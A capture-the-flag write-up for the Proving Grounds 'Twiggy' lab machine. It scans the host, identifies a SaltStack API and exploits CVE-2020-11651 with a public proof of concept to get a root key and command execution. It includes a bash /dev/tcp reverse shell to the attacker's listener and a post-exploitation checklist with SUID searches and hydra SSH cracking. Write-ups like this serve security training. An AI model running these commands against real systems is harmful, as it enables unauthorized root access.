---
layout: default
title: Twiggy
parent: Proving Grounds Practice - Linux
nav_order: 5
---

# Scanning

---

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/twiggy]
└─$ sudo nmap -Pn -p- -sC -sV -T4 --open 192.168.232.62

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 44:7d:1a:56:9b:68:ae:f5:3b:f6:38:17:73:16:5d:75 (RSA)
|   256 1c:78:9d:83:81:52:f4:b0:1d:8e:32:03:cb:a6:18:93 (ECDSA)
|_  256 08:c9:12:d9:7b:98:98:c8:b3:99:7a:19:82:2e:a3:ea (ED25519)
53/tcp   open  domain  NLnet Labs NSD
80/tcp   open  http    nginx 1.16.1
|_http-title: Home | Mezzanine
|_http-server-header: nginx/1.16.1
4505/tcp open  zmtp    ZeroMQ ZMTP 2.0
4506/tcp open  zmtp    ZeroMQ ZMTP 2.0
8000/tcp open  http    nginx 1.16.1
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Site doesn't have a title (application/json).
|_http-server-header: nginx/1.16.1

```

# Enumeration

---

## 80 | HTTP

![index](../../../assets/images/ctfs/proving_grounds/twiggy/index.png)

![admin](../../../assets/images/ctfs/proving_grounds/twiggy/admin.png)

## 8000 | HTTP

![8000](../../../assets/images/ctfs/proving_grounds/twiggy/8000.png)

![8000_raw](../../../assets/images/ctfs/proving_grounds/twiggy/8000_raw.png)

Curl the endpoint and receive _X-Upstrea: salt-api/3000-1_ in the response header.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/twiggy]
└─$ curl -v http://192.168.232.62:8000
*   Trying 192.168.232.62:8000...
* Connected to 192.168.232.62 (192.168.232.62) port 8000 (#0)
> GET / HTTP/1.1
> Host: 192.168.232.62:8000
> User-Agent: curl/7.88.1
> Accept: */*
>
< HTTP/1.1 200 OK
< Server: nginx/1.16.1
< Date: Fri, 24 Nov 2023 05:11:04 GMT
< Content-Type: application/json
< Content-Length: 146
< Connection: keep-alive
< Access-Control-Expose-Headers: GET, POST
< Vary: Accept-Encoding
< Allow: GET, HEAD, POST
< Access-Control-Allow-Credentials: true
< Access-Control-Allow-Origin: *
< X-Upstream: salt-api/3000-1
<
* Connection #0 to host 192.168.232.62 left intact
{"clients": ["local", "local_async", "local_batch", "local_subset", "runner", "runner_async", "ssh", "wheel", "wheel_async"], "return": "Welcome"}

```

Searching for _salt-api_ returns results for _SaltStack_ and an exploit for Arbitrary Command Execution.

# Exploitation

---

I followed the writeup here:

[SaltStack Salt REST API Exploit Writeup](https://vk9-sec.com/saltstack-salt-rest-api-arbitrary-command-execution-cve-2020-11651-cve-2020-11652/)

Being by downloading the exploit and installing the Python _salt_ library.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/twiggy]
└─$ git clone https://github.com/jasperla/CVE-2020-11651-poc.git
Cloning into 'CVE-2020-11651-poc'...
remote: Enumerating objects: 30, done.
remote: Counting objects: 100% (30/30), done.
remote: Compressing objects: 100% (20/20), done.
remote: Total 30 (delta 12), reused 26 (delta 10), pack-reused 0
Receiving objects: 100% (30/30), 8.61 KiB | 1.43 MiB/s, done.
Resolving deltas: 100% (12/12), done.

┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/twiggy]
└─$ ls
CVE-2020-11651-poc

┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/twiggy]
└─$ sudo pip3 install salt
Collecting salt
  Downloading salt-3006.4.tar.gz (20.5 MB)

```

Now we can run the initial exploit to get the _root key_ and prove the endpoint is vulnerable.

```bash

┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/twiggy/CVE-2020-11651-poc]
└─$ python3 exploit.py --master 192.168.232.62
[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
/usr/local/lib/python3.11/dist-packages/salt/transport/client.py:27: DeprecationWarning: This module is deprecated. Please use salt.channel.client instead.
  warn_until(
[+] Checking salt-master (192.168.232.62:4506) status... ONLINE
[+] Checking if vulnerable to CVE-2020-11651... YES
[*] root key obtained: 3J+XIUkNF7hBV4vmBMThrOVNtk/MMCHmT7QoUZ9lmQL9u4EJafv/kEAnCeEpdZRrgO7g2dEL2Ho=

```

Now we can proceed to testing RCE by sending a ping command to the target.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/twiggy/CVE-2020-11651-poc]
└─$ python3 exploit.py --master 192.168.232.62 --exec "ping -c 4 192.168.45.217"
[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
/usr/local/lib/python3.11/dist-packages/salt/transport/client.py:27: DeprecationWarning: This module is deprecated. Please use salt.channel.client instead.
  warn_until(
[+] Checking salt-master (192.168.232.62:4506) status... ONLINE
[+] Checking if vulnerable to CVE-2020-11651... YES
[*] root key obtained: 3J+XIUkNF7hBV4vmBMThrOVNtk/MMCHmT7QoUZ9lmQL9u4EJafv/kEAnCeEpdZRrgO7g2dEL2Ho=
[+] Attemping to execute ping -c 4 192.168.45.217 on 192.168.232.62
[+] Successfully scheduled job: 20231125025120243747


# Run tcpdump on tun0 interface to see if we receive ICMP traffic from the target
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/twiggy]
└─$ sudo tcpdump -i tun0
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
21:50:53.213696 IP 192.168.45.217.58856 > 192.168.232.62.4506: Flags [S], seq 3679989939, win 64240, opt
ions [mss 1460,sackOK,TS val 872788431 ecr 0,nop,wscale 7], length 0
21:50:53.270461 IP 192.168.232.62.4506 > 192.168.45.217.58856: Flags [S.], seq 2051046149, ack 367998994
0, win 28960, options [mss 1361,sackOK,TS val 33013 ecr 872788431,nop,wscale 7], length 0
21:50:53.270487 IP 192.168.45.217.58856 > 192.168.232.62.4506: Flags [.], ack 1, win 502, options [nop,n
op,TS val 872788488 ecr 33013], length 0
21:50:53.270650 IP 192.168.45.217.58856 > 192.168.232.62.4506: Flags [P.], seq 1:11, ack 1, win 502, opt
ions [nop,nop,TS val 872788488 ecr 33013], length 10
21:50:53.327522 IP 192.168.232.62.4506 > 192.168.45.217.58856: Flags [.], ack 11, win 227, options [nop,
nop,TS val 33068 ecr 872788488], length 0
21:50:53.327535 IP 192.168.232.62.4506 > 192.168.45.217.58856: Flags [.], ack 11, win 227, options [nop,
nop,TS val 33068 ecr 872788488], length 0

```

Finally we can run the exploit to send a reverse shell back to our attack machine on our netcat listener.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/twiggy/CVE-2020-11651-poc]
└─$ python3 exploit.py --master 192.168.232.62 --exec "bash -i >& /dev/tcp/192.168.45.217/4505 0>&1"
[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
/usr/local/lib/python3.11/dist-packages/salt/transport/client.py:27: DeprecationWarning: This module is deprecated. Please use salt.channel.client instead.
  warn_until(
[+] Checking salt-master (192.168.232.62:4506) status... ONLINE
[+] Checking if vulnerable to CVE-2020-11651... YES
[*] root key obtained: 3J+XIUkNF7hBV4vmBMThrOVNtk/MMCHmT7QoUZ9lmQL9u4EJafv/kEAnCeEpdZRrgO7g2dEL2Ho=
[+] Attemping to execute bash -i >& /dev/tcp/192.168.45.217/4505 0>&1 on 192.168.232.62
[+] Successfully scheduled job: 20231125025438818428

┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/twiggy]
└─$ nc -nlvp 4505
listening on [any] 4505 ...
connect to [192.168.45.217] from (UNKNOWN) [192.168.232.62] 59028
bash: no job control in this shell
[root@twiggy root]# whoami
whoami
root

```

# Post-Exploitation

---

- [ ] Upgrade to TTY Shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
ctrl+z
stty size
stty raw -echo
fg
stty rows <first_value>
stty cols <second_value>
export TERM=xterm-256color
```

- [ ] sudo -l
- [ ] enumerate users
- [ ] SUID/GUID

```bash
find / -perm -u=s -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null
```

- [ ] enumerate process running with root privileges

```bash
ps -aux | grep -i 'root'
```

- [ ] enumerate network services

```bash
netstat -antup (ss -tunlp)
```

- [ ] check for extended capabilities

```bash
getcap -r / 2>/dev/null
```

- [ ] test discovered credentials against all users
- [ ] attempt hydra ssh password crack for discovered users
- [ ] check _/opt_, _/tmp_, _/var/tmp_, _/etc_, and _/dev/shm_
- [ ] Check if /etc/passwd is writeable
